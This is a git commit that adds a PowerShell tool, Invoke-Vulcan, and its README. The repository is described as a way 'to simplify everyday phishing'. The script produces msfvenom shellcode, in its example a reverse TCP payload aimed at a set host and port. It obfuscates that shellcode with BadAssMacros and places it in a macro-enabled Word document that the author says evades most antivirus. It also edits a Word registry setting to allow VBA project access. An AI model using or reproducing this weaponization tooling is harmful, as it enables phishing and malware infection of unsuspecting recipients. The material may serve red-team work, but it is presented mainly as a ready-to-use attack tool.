cc97fe9615669165c17743d165f5eb8c14f48469
Alexandre Teyar <11601622+aress31@users.noreply.github.com>
2022-07-25 22:51:26 +0100

    Init

---
+++ Invoke-Vulcan.ps1
@@ -0,0 +1,120 @@
+function Invoke-Vulcan {
+    <#
+    .SYNOPSIS
+        Automate the creation of macro-enabled Word documents that - at the time of writing - evades most AVs, including Windows Defender.
+
+        Author: Alexandre Teyar (@aress31)
+        License: BSD 3-Clause
+        Required Dependencies: Windows Subsystem for Linux (WSL), BadAssMacros
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        Using MSFVenom and BadAssMacros, creates a macro-enabled Word document that - at the time
+        of writing - evade most AVs, including Windows Defender.
+        
+    .PARAMETER BadAssMacros
+        Specifies the path to the BadAssMacro executable.
+
+    .PARAMETER OutputDirectory
+        Folder to output files too.
+    
+    .PARAMETER OutputPrefix
+        Prefix to add to output files.
+
+    .PARAMETER Payload
+        Specifies the MSFVenom payload to use.
+
+    .PARAMETER PayloadOptions
+        Specifies the options to use to generate the MSFVenom shellcode.    
+
+    .EXAMPLE
+        PS C:\> Invoke-Vulcan -BadAssMacros "C:\Users\aress31\GitHub\BadAssMacros\BadAssMacrosx64.exe" -Payload "windows/pingback_reverse_tcp" -PayloadOptions "LHOST=192.168.0.24 LPORT=4444 EXITFUNC=thread"
+
+        Executes MSFVenom with the specified payload and options, pass the generated raw shellcode to BadAssMacros to obfuscate it in order to evade AVs,
+        and then removes creates an empty macro-enabled Word document containing the processed macro.
+    #>
+
+    [CmdletBinding(PositionalBinding = $false)]
+    param(
+        [Parameter(Mandatory)]
+        [ValidateScript({ Test-Path -Path $_ -PathType Leaf })]
+        [String]
+        $BadAssMacros,
+
+        [ValidateScript({ Test-Path -Path $_ -PathType Container })]
+        [String]
+        $OutputDirectory = $(Get-Location),
+
+        [String]
+        $OutputPrefix = "vulcan",
+
+        [Parameter(Mandatory)]
+        [String]
+        $Payload,
+
+        [Parameter(Mandatory)]
+        [String]
+        $PayloadOptions
+    )
+
+    begin {
+        $PayloadOutput = "${env:TEMP}\msfvenom_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).docx"
+        $BAMOutput = "${env:TEMP}\badassmacros_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).txt"
+        
+        $Match = $payloadOptions | Select-String -Pattern "LHOST=(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})"
+        $LHOST = $match.matches.groups[1].Value
+        $Match = $PayloadOptions | Select-String -Pattern "LPORT=(\d{1,3}\b)"
+        $LPORT = $match.matches.groups[1].Value
+        
+        Resolve-Path `
+            -Path $(Join-Path -Path $OutputDirectory "$($Payload.Replace('/', '-')).${LHOST}-${LPORT}.$(Get-Date -Format yyyy-MM-dd_hh-mm-ss).doc") `
+            -ErrorAction SilentlyContinue -ErrorVariable _frperror
+
+        $WordOutput = $_frperror[0].TargetObject
+
+        Write-Output "[+] Enabling trust access to VBA Project Object Model in Microsoft Word..."
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
+    }
+
+    process {
+        Create_Payload -Payload $Payload -PayloadOptions $PayloadOptions -PayloadOutput $PayloadOutput
+        Create_VBAMacro -BAMBin $BadAssMacros -BAMInput $PayloadOutput -BAMOutput $BAMOutput
+        Create_WordDocument -BAMOutput $BAMOutput -Output $WordOutput
+    }
+
+    end {
+        Write-Host "[-] Removing payload file..."
+        Remove-Item -Path $PayloadOutput -Force
+        Write-Host "[-] Removing VBA macro file..."
+        Remove-Item -Path $BAMOutput -Force
+        
+        Write-Output "[+] Disabling trust access to VBA Project Object Model in Microsoft Word..."
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" -Name "AccessVBOM" -Value 1
+    }
+}
+
+function Create_Payload($Payload, $PayloadOptions, $PayloadOutput) {
+    Write-Host "[i] Creating payload..."
+    $WSLPath = wsl.exe --exec wslpath -a $PayloadOutput
+    wsl.exe --exec msfvenom -p $Payload $PayloadOptions -f raw -o $WSLPath
+    Write-Host "[i] Payload written to:" $PayloadOutput
+}
+
+function Create_VBAMacro($BAMBin, $BAMInput, $BAMOutput) {
+    Write-Host "[i] Creating VBA macro..."
+    $CaesarShift = Get-Random -Minimum 1 -Maximum 25
+    & $BAMBin -w doc -p no -s indirect -c $CaesarShift -i $BAMInput -o $BAMOutput
+}
+
+function Create_WordDocument($BAMOutput, $Output) {
+    Write-Host "[i] Creating macro-enabled Word document..."
+    $Word = New-Object -ComObject Word.Application
+    $Doc = $Word.Documents.Add()
+    $VBComp = $Doc.VBProject.VBComponents.Add(1)
+    $VBAMacro = Get-Content -Path $BAMOutput
+    $VBComp.CodeModule.AddFromString($VBAMacro)
+
+    Write-Host "[+] Word document written to: $Output" 
+    $Doc.SaveAs($Output)
+    $Doc.Close()
+}
--- README.md
+++ README.md
@@ -1,2 +1,73 @@
 # vulcan
-A collection of PowerShell script to simplify phishing. 🎣
+
+[![Language](https://img.shields.io/badge/Lang-powershell-blue.svg)](https://docs.microsoft.com/en-gb/powershell/)
+[![License](https://img.shields.io/badge/License-BSD%203-red.svg)](https://opensource.org/licenses/BSD-3-Clause)
+
+## A collection of `PowerShell` script to simplify everyday phishing. 🎣
+
+For now, a simple `PowerShell` script to automate the entire process of generating consistent and efficient macro-enabled `Word` documents that actually manage to evade - *at the time of writing* - most AVs, including `Windows Defender`. This script is a wrapper around [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) - made possible thanks to [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) and [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros).
+
+More features might follow, but this repository mainly serves as a place for the community to build and improve upon the existing. 🐺
+
+## Requirements
+
+- [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
+- [Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/install) with [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) installed.
+
+## Installation
+
+1. Clone/download `vulcan`:
+
+    ```powershell
+    git clone https://github.com/aress31/vulcan
+    cd vulcan
+    ```
+
+2. Import `vulcan`:
+
+    ```powershell
+    . .\Invoke-Vulcan.ps1
+    ```
+
+3. Run `vulcan`:
+
+    ```powershell
+    Invoke-Vulcan -BadAssMacros $BadAssMacros -Payload $Payload -PayloadOptions $PayloadOptions
+    ```
+
+> Although obvious, `$BadAssMacros`, `$Payload` and `$PayloadOptions` are placeholders for your own values... 🙄
+
+## Usage
+
+`Get-Help -Name Invoke-Vulcan` is your friend... Even better if you use `Get-Help -Name Invoke-Vulcan -Detailed`.
+
+## Sponsor 💓
+
+If you want to support this project and appreciate the time invested in developping, maintening and extending it; consider donating toward my next (cup of coffee ☕/lamborghini 🚗) - as **a lot** of my **personal time** went into creating this project. 😪
+
+It is easy, all you got to do is press the `Sponsor` button at the top of this page or alternatively [click this link](https://github.com/sponsors/aress31). 😁
+
+## Reporting Issues
+
+Found a bug 🐛? I would love to squash it!
+
+Please report all issues on the GitHub [issues tracker](https://github.com/aress31/vulcan/issues).
+
+## Contributing
+
+You would like to contribute to better this project? 🤩
+
+Please submit all `PRs` on the GitHub [pull requests tracker](https://github.com/aress31/vulcan/pulls).
+
+## Acknowledgements
+
+Give to Caesar what belongs to Caesar:
+
+- [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
+- [MSFVenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
+
+## License
+
+`vulcan` is primarily distributed under the terms of the `BSD 3`.
+
+See [LICENSE](./LICENSE) for details.
